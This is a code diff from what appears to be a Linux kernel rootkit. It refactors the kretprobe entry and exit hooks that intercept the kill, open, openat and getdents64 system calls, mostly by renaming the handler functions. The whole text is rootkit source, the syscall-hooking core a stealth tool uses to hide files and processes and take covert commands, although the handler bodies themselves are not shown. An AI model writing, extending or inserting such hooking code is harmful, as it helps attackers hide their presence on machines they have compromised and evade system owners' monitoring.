@@ -21,22 +21,23 @@ static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
 
   int syscall_number = *(int *)&syscall_regs->orig_ax;
   if (syscall_number == KILL_SYSCALL) {
-    hide_handler(syscall_regs);
+    int sig = syscall_regs->si;
+    int pid = syscall_regs->di;
+    sys_kill_kprobe_enter_handler(sig, pid);
     data->syscall = KILL;
   } else if (syscall_number == OPEN_AT_SYSCALL) {
     char *__user filename = (char *)syscall_regs->si;
-    open_enter_handler(filename, data);
+    sys_open_kprobe_enter_handler(filename, data);
     data->syscall = OPEN;
   } else if (syscall_number == OPEN_SYSCALL) {
     char *__user filename = (char *)syscall_regs->di;
-    open_enter_handler(filename, data);
+    sys_open_kprobe_enter_handler(filename, data);
     data->syscall = OPEN;
   } else if (syscall_number == GETDENTS64_SYSCALL) {
-
-    data->syscall = GET_DENTS;
     data->data.getdents_data.buf_size = *(unsigned int *)&syscall_regs->dx;
     data->data.getdents_data.entries =
         (struct linux_dirent64 *)syscall_regs->si;
+    data->syscall = GET_DENTS;
   }
 
   return 0;
@@ -46,10 +47,10 @@ static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
   struct rootkit_cmd *data = (struct rootkit_cmd *)k->data;
 
   if (data->syscall == OPEN) {
-    open_exit_handler(regs, *data);
+    sys_open_kprobe_exit_handler(regs, *data);
   }
   if (data->syscall == GET_DENTS) {
-    getdents64_exit_handler(regs, *data);
+    sys_getdents64_kprobe_exit_handler(regs, *data);
   }
 
   // free_rootkit_cmd(*data);
